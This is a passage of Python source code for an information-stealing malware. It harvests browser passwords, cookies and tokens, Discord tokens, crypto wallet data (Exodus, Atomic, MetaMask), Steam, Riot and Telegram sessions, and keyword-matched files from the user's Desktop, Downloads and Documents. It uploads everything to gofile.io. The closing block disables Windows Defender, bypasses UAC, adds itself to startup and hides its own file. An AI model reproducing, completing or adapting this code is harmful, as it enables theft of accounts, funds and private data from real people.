        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
        #lnik = "https://google.com"
        os.remove(f"{pathC}/{name}.zip")

        if "Wallet" in arg or "eogaeaoehlef" in arg:
            WalletsZip.append([name, lnik])
        elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
            GamingZip.append([name, lnik])
        else:
            OtherZip.append([name, lnik])


    def GatherAll():
        '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
        browserPaths = [
            [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
            [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
        ]

        discordPaths = [
            [f"{roaming}/Discord", "/Local Storage/leveldb"],
            [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
            [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
            [f"{roaming}/discordptb", "/Local Storage/leveldb"],
        ]

        PathsToZip = [
            [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
            [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
            ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
            [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
            [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
        ]
        Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

        for patt in browserPaths: 
            a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
            a.start()
            Threadlist.append(a)
        for patt in discordPaths: 
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)

        for patt in browserPaths: 
            a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
            a.start()
            Threadlist.append(a)

        ThCokk = []
        for patt in browserPaths: 
            a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
            a.start()
            ThCokk.append(a)

        threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


        for thread in ThCokk: thread.join()
        DETECTED = Trust(Cookies)
        if DETECTED == True: return

        for patt in browserPaths:
            threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
        
        for patt in PathsToZip:
            threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
        
        threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

        for thread in Threadlist: 
            thread.join()
        global upths
        upths = []

        for file in ["sies-password.txt", "sies-cookies.txt"]: 
            # upload(os.getenv("TEMP") + "\\" + file)
            upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

    def uploadToAnonfiles(path):
        try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
        except:return False

    # def uploadToAnonfiles(path):s
    #     try:
    #         files = { "file": (path, open(path, mode='rb')) }
    #         upload = requests.post("https://transfer.sh/", files=files)
    #         url = upload.text
    #         return url
    #     except:
    #         return False

    def KiwiFolder(pathF, keywords):
        global KiwiFiles
        maxfilesperdir = 7
        i = 0
        listOfFile = os.listdir(pathF)
        ffound = []
        for file in listOfFile:
            if not os.path.isfile(pathF + "/" + file): return
            i += 1
            if i <= maxfilesperdir:
                url = uploadToAnonfiles(pathF + "/" + file)
                ffound.append([pathF + "/" + file, url])
            else:
                break
        KiwiFiles.append(["folder", pathF + "/", ffound])

    KiwiFiles = []
    def KiwiFile(path, keywords):
        global KiwiFiles
        fifound = []
        listOfFile = os.listdir(path)
        for file in listOfFile:
            for worf in keywords:
                if worf in file.lower():
                    if os.path.isfile(path + "/" + file) and ".txt" in file:
                        fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                        break
                    if os.path.isdir(path + "/" + file):
                        target = path + "/" + file
                        KiwiFolder(target, keywords)
                        break

        KiwiFiles.append(["folder", path, fifound])

    def Kiwi():
        user = temp.split("\AppData")[0]
        path2search = [
            user + "/Desktop",
            user + "/Downloads",
            user + "/Documents"
        ]

        key_wordsFolder = [
            "account",
            "acount",
            "passw",
            "secret"

        ]

        key_wordsFiles = [
            "passw",
            "mdp",
            "motdepasse",
            "mot_de_passe",
            "login",
            "secret",
            "account",
            "acount",
            "paypal",
            "banque",
            "account",                                                          
            "metamask",
            "wallet",
            "crypto",
            "exodus",
            "discord",
            "2fa",
            "code",
            "memo",
            "compte",
            "token",
            "backup",
            "secret",
            "mom",
            "family"
            ]

        wikith = []
        for patt in path2search: 
            kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
            wikith.append(kiwi)
        return wikith


    global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

    keyword = [
        'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
    ]

    CookiCount, PasswCount = 0, 0
    cookiWords = []
    paswWords = []

    WalletsZip = [] # [Name, Link]
    GamingZip = []
    OtherZip = []

    GatherAll()
    DETECTED = Trust(Cookies)
    # DETECTED = False
    if not DETECTED:
        wikith = Kiwi()

        for thread in wikith: thread.join()
        time.sleep(0.2)

        filetext = "\n"
        for arg in KiwiFiles:
            if len(arg[2]) != 0:
                foldpath = arg[1]
                foldlist = arg[2]       
                filetext += f"📁 {foldpath}\n"

                for ffil in foldlist:
                    a = ffil[0].split("/")
                    fileanme = a[len(a)-1]
                    b = ffil[1]
                    filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
                filetext += "\n"
        upload("zips", filetext)
    if __name__ == '__main__':
        Thread(target= system.unblockMOTW, args= [sys.executable], daemon= True).start()
        
        Thread(target= system.disableWD, daemon= True).start()
        system.WDexclude(system.getSelf()[0])
        system.WDexclude(MEIPASS)
        
        system.isAdmin()
        system.UACbypass()
        
        utils.copy(os.path.join(MEIPASS, 'bound.exe'), boundfile := os.path.join(os.getenv('temp'), 'bound', '{}.exe'.format(utils.generate())))
        os.startfile(boundfile) 
        startupfilepath = system.putInStartup()
        system.WDexclude(startupfilepath) 
        subprocess.run(f"attrib +h +s '{system.getSelf()[0]}'", shell= True, capture_output= True)  
    upload2("sysin4" , path="")
    time.sleep(1800)      